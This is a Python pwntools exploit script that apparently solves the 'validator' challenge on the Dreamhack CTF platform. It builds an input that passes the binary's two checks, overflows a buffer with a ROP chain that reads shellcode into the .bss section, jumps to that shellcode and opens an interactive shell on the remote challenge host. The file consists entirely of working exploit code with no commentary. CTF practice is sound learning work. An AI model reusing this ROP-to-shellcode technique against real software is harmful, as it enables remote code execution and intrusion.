from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/validator_dist')
else:
    r = remote('host1.dreamhack.games', 9998)


def generate_payload(ropchain):
    # first condition
    payload = b'DREAMHACK!'
    payload += b' '

    # second condition
    for i in range(11, 0x82):
        payload += bytes([0x82 - i])

    # ROP
    payload = payload.ljust(0x88, b' ')
    payload += ropchain

    return payload


pop_rdi = 0x4006f3  # pop rdi; ret
pop_rsi_r15 = 0x4006f1  # pop rsi; pop r15; ret
pop_rdx = 0x40057b  # pop rdx; ret
bss = 0x601050  # empty bss
read_plt = 0x400470  # PLT of read()


# insert shellcode in bss
# read(0, bss, 100)
rop = p64(pop_rdi)
rop += p64(0)
rop += p64(pop_rsi_r15)
rop += p64(bss)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(100)
rop += p64(read_plt)

rop += p64(bss)  # jump to shellcode

payload = generate_payload(rop)
r.send(payload)

shellcode = asm(shellcraft.sh())
r.send(shellcode)


r.interactive()